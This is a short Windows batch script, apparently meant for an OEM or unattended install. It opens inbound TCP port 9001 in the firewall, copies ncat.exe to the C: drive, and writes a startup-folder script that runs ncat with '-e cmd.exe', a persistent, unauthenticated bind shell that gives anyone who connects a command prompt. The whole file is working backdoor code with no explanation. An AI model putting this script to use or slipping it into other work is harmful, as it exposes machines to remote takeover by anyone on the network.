@echo off

netsh advfirewall firewall add rule name="9001/tcp" dir=in action=allow protocol=TCP localport=9001

copy c:\OEM\ncat.exe c:\ncat.exe

echo c:\ncat.exe -k -lvnp 9001 -e cmd.exe > "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\listener.bat"

